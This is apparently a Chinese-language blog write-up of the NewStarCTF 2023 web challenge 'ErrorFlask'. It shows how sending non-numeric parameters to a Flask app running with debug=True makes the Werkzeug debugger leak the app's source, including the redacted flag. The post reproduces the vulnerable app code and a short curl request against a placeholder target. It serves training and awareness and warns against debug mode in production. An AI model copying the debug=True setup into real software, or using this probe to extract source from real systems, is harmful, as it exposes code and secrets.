---
title: NewStarCTF 2023 - Web - ErrorFlask
date: 2026-11-14 18:18:00
categories:
  - CTF
  - NewStarCTF 2023
  - Web
tags:
  - Flask debug
  - Werkzeug调试器
  - 源码泄露
  - 报错触发
cover: /img/cover/petal-smiley-faces.jpg
description: NewStarCTF 2023 公开赛道 Web 简单题，考察 Flask 开启调试模式后调试器泄露源码。首页要求传两个数字参数做加法，传入非数字会触发类型转换报错，调试器回显完整追踪与应用源码，源码首行即为 flag。
keywords:
  - ErrorFlask
  - Flask debug
  - Werkzeug
  - Traceback
  - 源码泄露
ai: >-
  本题来自 NewStarCTF 2023 公开赛道 Web 方向，环境为 Python 加 Flask 与 openresty。首页要求提交两个参数做加法，正常回显运算结果并提示不是模板注入、答案藏在源码里。漏洞在于应用以调试模式启动，未捕获的异常会被调试器接管并回显完整追踪与源码帧。利用链为向数字参数传入字母，令类型转换抛出数值错误，触发调试器泄露应用源码，首行的答案变量即为所求，最终读到脱敏后的 flag。题名与报错提示都是线索，核心是主动制造异常借调试器读源码，而不是模板注入或命令执行，生产环境切勿开启调试模式。
copyright_author: Hunter
---

## 题目信息

| 项 | 内容 |
|---|---|
| 比赛 | NewStarCTF 2023 公开赛道 |
| 方向 | Web |
| 难度 | Easy |
| 环境 | 授权靶场（已脱敏） |
| 服务器 | Python 3.8 + Flask（Werkzeug debug） + openresty |

## 信息收集

访问根路径 `/`，返回 `give me number1 and number2,i will help you to add`，说明需要传 `number1`、`number2` 两个参数做加法运算。

正常传参 `/?number1=1&number2=2` 返回 `not ssti,flag in source code~3`：`3` 是 `1+2` 的结果；`not ssti` 排除 Jinja2 模板注入方向；`flag in source code` 明确指出 flag 在源码里。

```http
GET /?number1=1&number2=2 HTTP/1.1
Host: target:8080

HTTP/1.1 200 OK

not ssti,flag in source code~3
```

## 漏洞分析

- Flask `debug=True` 模式下的 Werkzeug 调试器信息泄露
- Traceback 源码泄露

攻击链总览（源 wp 原链转写）：

```bash
# 访问首页 → 提示需要 number1、number2 参数做加法
#   → 传非数字参数（number1=a）触发 int() ValueError
#   → Flask debug 模式的 Werkzeug 调试器弹出完整 traceback
#   → traceback 泄露 /app/app.py 源码
#   → 源码首行 flag = "..."
```

应用以 `app.run(..., debug=True)` 运行，后端对参数执行 `int(num1)`。传入非数字字符串会抛 `ValueError: invalid literal for int() with base 10: 'a'`，异常被调试器捕获并回显源码帧。

## 利用过程

### 1. 触发报错泄露源码

传非数字参数 `/?number1=a&number2=b`，后端 `int('a')` 抛出 `ValueError`，Werkzeug 调试器返回完整 traceback，其中 `/app/app.py` 源码被完整展示：

```python
flag = "flag{xxxx}"
num1 = request.args.get("number1");
num2 = request.args.get("number2");
if not num1:
    return "give me number1 and number2,i will help you to add"
return "not ssti,flag in source code~"+str(int(num1)+int(num2))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
```

> 源码首行的 flag 真实值已按要求脱敏为 `flag{xxxx}`。

### 2. 拿到 flag

源码第一行即为 flag：`flag{xxxx}`（已脱敏）。

## 完整 EXP

```bash
curl "http://target:8080/?number1=a&number2=b"
# 在返回的 traceback 中查找 "flag = "，或直接查看响应里的 /app/app.py 源码帧
```

```http
GET /?number1=a&number2=b HTTP/1.1
Host: target:8080
```

## Flag

`flag{xxxx}`（真实值已脱敏）。原题采用 NewStarCTF 2023 的 flag 格式，并非平台统一的另一种格式，提交时按题目实际格式填写。

## 踩坑与总结

1. **题目名 `ErrorFlask` + 描述 `Err...` 是解题提示**：核心是「制造报错（Error）」→ 利用 Flask 的 debug 模式泄露源码。
2. **`not ssti` 是干扰/纠偏**：明确告诉你不是 SSTI，不要往 Jinja2 模板注入方向走。
3. **触发点**：`int(num1)` 对非数字字符串抛 `ValueError`，而 `debug=True` 使异常被 Werkzeug 调试器捕获并回显源码。
4. **生产环境切勿开启 debug**：本题是典型的配置失误导致源码泄露，实战中 Werkzeug 调试器还可能被用作交互式代码执行入口。

> 仅记录授权靶场环境下的研究；复现命令与源码帧均来自本地 WP 归档。
